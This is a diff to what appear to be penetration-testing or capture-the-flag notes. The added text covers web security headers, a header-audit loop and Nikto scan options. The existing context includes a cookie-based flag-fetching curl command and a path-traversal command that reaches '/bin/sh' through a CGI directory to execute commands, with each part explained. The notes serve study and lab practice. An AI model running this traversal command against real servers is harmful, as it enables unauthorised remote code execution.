@@ -74,7 +74,7 @@ Payment Card Industry Data Security Standard
    `curl -b cookies.txt http://target:3000/api/admin/flag`
 
 
-## Next.js
+### Next.js
 
 - **`X-Powered-By: Next.js`** header  
 - **HTML source contains `window.__next_f`** (definitive App Router indicator)  
@@ -163,4 +163,45 @@ curl -s --path-as-is "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --d
 - `/.%2e/.%2e/.%2e/.%2e/` = traverse up 4 directories to filesystem root
 - `/bin/sh` = execute shell
 - POST body must include `echo Content-Type: text/plain; echo;` (CGI header requirement)
+
+
+# Web Server Attacks - I
+[LINK]()
+
+
+
+### Common headers and their purpose
+
+| Header | Protects against | Example value |
+|--------|------------------|----------------|
+| `X-Frame-Options` | Clickjacking (iframe embedding) | `DENY` or `SAMEORIGIN` |
+| `X-Content-Type-Options` | MIME sniffing | `nosniff` |
+| `Content-Security-Policy` | XSS, resource loading restrictions | `default-src 'self'` |
+| `Referrer-Policy` | Referer header leakage | `no-referrer` |
+| `Strict-Transport-Security` | Forces HTTPS (HTTPS only) | `max-age=31536000` |
+
+> **Note:** `X-Frame-Options` is superseded by `Content-Security-Policy: frame-ancestors`. Modern sites may use CSP alone.
+.
+
+#### Quick audit command
+```bash
+for port in 80 8000 3000 8080; do
+  curl -sI http://target:$port/ | grep -iE "x-frame-options|x-content-type|content-security-policy|strict-transport|referrer-policy"
+done
+```
+
+### Nikto
+```bash
+nikto -h http://target:port -nointeractive
+```
+- `-nointeractive` suppresses prompts.
+
+
+#### Tuning option (reduce noise)
+```bash
+nikto -h TARGET -Tuning 123
+```
+- `123` = common findings (concatenated, no commas)
+
+
 
